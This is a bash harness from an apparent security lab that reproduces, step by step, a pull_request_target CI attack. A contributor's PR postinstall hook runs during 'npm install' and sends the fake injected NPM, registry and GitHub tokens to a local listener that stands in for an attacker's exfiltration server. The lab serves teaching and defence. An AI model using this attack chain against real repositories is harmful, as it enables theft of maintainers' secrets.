#!/usr/bin/env bash
#
# Local harness that emulates how GitHub's runner executes the vulnerable
# `.github/workflows/pr-validate.yml` against a contributor's pull request.
#
# It is NOT GitHub Actions. It just reproduces, step by step, what the workflow
# does so you can watch the impact without needing a real repo or CI.
#
# Steps mirrored from the workflow:
#   1. pull_request_target injects repository secrets into the job environment.
#   2. actions/checkout pulls the PR head -> the attacker's files land on disk.
#   3. `npm install` runs in app/ -> the PR's postinstall hook executes.
#
set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CHALLENGE_ROOT="$(cd "$HERE/.." && pwd)"
WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"; [ -n "${SINK_PID:-}" ] && kill "$SINK_PID" 2>/dev/null || true' EXIT

echo "==> [pull_request_target] injecting repository secrets into the job env"
# In the real workflow these come from `secrets.*`. Fake values for the lab.
export NPM_TOKEN="npm_FAKEtoken_do_not_use_AAAA1111"
export REGISTRY_TOKEN="reg_FAKEtoken_do_not_use_BBBB2222"
export GITHUB_TOKEN="ghs_FAKEtoken_do_not_use_CCCC3333"
export EXFIL_SINK="http://127.0.0.1:9999/collect"

echo "==> starting local exfil listener on 127.0.0.1:9999 (stands in for attacker server)"
node "$HERE/sink.js" &
SINK_PID=$!
sleep 1

echo "==> [actions/checkout ref=pull_request.head.sha] materializing the contributor's PR"
# Start from the clean base repo...
cp -R "$CHALLENGE_ROOT/app" "$WORK/app"
# ...then overlay the attacker's PR changes (this is what checking out the PR head does).
cp -R "$HERE/malicious-pr/app/." "$WORK/app/"

echo "==> [run: npm install] installing the project (triggers lifecycle scripts)"
( cd "$WORK/app" && npm install --no-audit --no-fund )

echo ""
echo "==> what the attacker's listener received:"
cat "$HERE/.sink-output" 2>/dev/null || echo "(nothing captured)"
echo ""
echo "==> If you see the fake NPM_TOKEN / GITHUB_TOKEN above, the untrusted PR"
echo "    just ran its own code on the runner and read the maintainers' secrets."
